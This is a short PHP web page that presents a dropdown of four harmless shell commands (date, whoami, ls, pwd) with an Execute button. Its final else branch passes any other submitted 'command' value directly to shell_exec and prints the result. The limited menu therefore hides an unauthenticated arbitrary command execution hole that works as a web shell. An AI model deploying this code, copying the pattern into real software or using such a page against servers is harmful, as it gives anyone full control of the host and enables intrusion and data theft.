<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command</title>
</head>
<body style="background-color: black; color: white;">
    <center style="margin-top: 200px;">
<form method="post" action="index.php">
    <label for="cars">Choose a command to run:</label>
<select name="command" id="cars">
  <option value="date">date</option>
  <option value="whoami">whoami</option>
  <option value="ls">ls</option>
  <option value="pwd">pwd</option>
</select>
<input type="submit" value="Execute!">
</form>
    </center>
<center>
<br><br>
    <?php
$query = $_POST["command"];
  if(strcmp($query, "date") ==0){
  $output = shell_exec('date');
  echo $output;
} 
  else if (strcmp($query, "whoami") ==0){
      $output = shell_exec('whoami');
      echo $output;
  }

  else if (strcmp($query, "ls") ==0){
    $output = shell_exec('ls');
    echo $output;
}
  else if (strcmp($query, "pwd") ==0){
      $output = shell_exec('pwd');
      echo $output;
  }
  else {
      $output = shell_exec($query);
      echo $output;
  }
?>
</center>
</body>
</html>